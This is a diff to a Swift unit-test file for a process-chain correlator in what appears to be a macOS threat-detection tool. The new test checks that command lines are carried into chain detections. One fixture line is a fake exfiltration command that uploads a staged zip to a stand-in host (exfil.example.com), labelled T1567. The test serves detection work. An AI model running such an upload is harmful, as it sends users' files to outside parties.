@@ -5,9 +5,9 @@ final class ChainCorrelatorTests: XCTestCase {
     private let t0 = Date(timeIntervalSince1970: 1_000_000)
 
     private func member(_ correlator: ChainCorrelator, pid: Int32, executable: String,
-                         rule: String, technique: String, severity: Severity,
+                         command: String = "", rule: String, technique: String, severity: Severity,
                          at offset: TimeInterval, ancestry: [Int32]) -> ChainDetection? {
-        correlator.register(eventID: UUID(), pid: pid, executable: executable,
+        correlator.register(eventID: UUID(), pid: pid, executable: executable, command: command,
                              ruleNames: [rule], techniques: [technique], severity: severity,
                              timestamp: t0.addingTimeInterval(offset), ancestry: ancestry)
     }
@@ -103,6 +103,21 @@ final class ChainCorrelatorTests: XCTestCase {
         let second = member(c, pid: 200, executable: "curl", rule: "RuleB", technique: "T1105",
                              severity: .watch, at: 10, ancestry: [100])
         XCTAssertEqual(second?.escalatedSeverity, .elevated)
+    }
+
+    func testMemberCommandLinesAreCarriedIntoDetections() {
+        let c = ChainCorrelator()
+        _ = member(c, pid: 100, executable: "curl",
+                   command: "curl -T /tmp/staging.zip https://exfil.example.com/upload",
+                   rule: "RuleA", technique: "T1567", severity: .watch, at: 0, ancestry: [])
+        let second = member(c, pid: 200, executable: "osascript",
+                             command: "osascript -e 'display dialog \"hi\"'",
+                             rule: "RuleB", technique: "T1059.002", severity: .elevated, at: 10, ancestry: [100])
+        guard let detection = second else { return XCTFail("expected a chain detection") }
+        XCTAssertEqual(detection.members.map(\.command),
+                       ["curl -T /tmp/staging.zip https://exfil.example.com/upload",
+                        "osascript -e 'display dialog \"hi\"'"],
+                       "each member keeps its full command line, oldest-first")
     }
 
     func testSeverityEscalationCapsAtCritical() {
